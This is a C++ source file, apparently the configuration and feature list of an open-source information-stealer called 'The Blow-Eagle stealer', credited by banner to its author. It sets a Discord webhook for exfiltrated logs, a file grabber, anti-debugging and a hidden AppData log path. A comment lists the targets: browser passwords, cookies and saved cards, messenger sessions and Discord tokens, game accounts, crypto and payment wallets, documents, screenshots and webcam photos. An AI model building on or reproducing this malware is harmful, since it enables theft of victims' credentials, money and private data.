/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|													by: Nick_Vinesmoke											   |
|											https://github.com/Nick-Vinesmoke									   |
|									https://github.com/Nick-Vinesmoke/The-Blow-Eagle							   |
|==================================================================================================================|
*/

#include <iostream>

// config
namespace config {
	const std::string Bot_url = ""; // url of your WebHook
	const std::string Bot_name = ""; // name of that WebHook
	const bool enableFileGrubber = false; // enable file grabber
	const bool oneStart = false; // enable this if you want logs to come only from unique computers
	const bool debuging = false; // disable AntiDebug (do not change if you do not know what it is responsible for)
	const std::string path = "/AppData/Local/System_cache"; // path to logs
}

/*
🔐open source turbo🚀 stealer written on C++, all logs will be sent using discord webhook. (in dev)

get methods to steal https://github.com/Nick-Vinesmoke/The-Murk-stealer

in result should be:

✅System info
	⌚Time
	💻OS
	💻HWID
	🔩CPU
		📜Cores
		📜CPU frequency
	📡IP
	📡Location
	💽RAM
		💾Available
		💾Used
	📜PC name
	💽Discs
		📜volumes
		💾All Memory
		💾Available
		💾Used
		📜File system type
	🧪Antiviruses
	🎥GPU
		🔩Type
		💾All memory in the GPU
		💾Free memory in the GPU
		📜Graphics card temperature
	📠Processes
✅Files .txt and .docx
	📝in Desktop
	📝in Documents
	📝in Downloads
🪁Messagers
	📢Telegram sessions
	📢Viber sessions
	📢Discord sessions + token-grabber + pwd-grabber
	📢Skype sessions
	📢WhatsApp sessions
	📢And more
⚔Game
	♠Steam
	♠Epic Games
	♠Uplay
	♠Roblox
	♠Minecraft
	And more
💳Wallets
	💵PayPal
	💵Kivi
	📈Binance
	📈Metamask
	📈Atomic
	💵And more
✅Browsers
	🔗Chrome
		🔑Passwords
		🔐Cookies
		📝History
		📥Downloads
		💳Cards
	🔗Firefox
		🔑Passwords
		🔐Cookies
		📝History
		📥Downloads
		💳Cards
	🔗Opera
		🔑Passwords
		🔐Cookies
		📝History
		📥Downloads
		💳Cards
	🔗Edge
		🔑Passwords
		🔐Cookies
		📝History
		📥Downloads
		💳Cards
	🔗Brave
		🔑Passwords
		🔐Cookies
		📝History
		📥Downloads
		💳Cards
		🔗And more
✅Other
	📸Sreenshot
	📸Camera photo
✅File grabber
✅Secure to use
*/
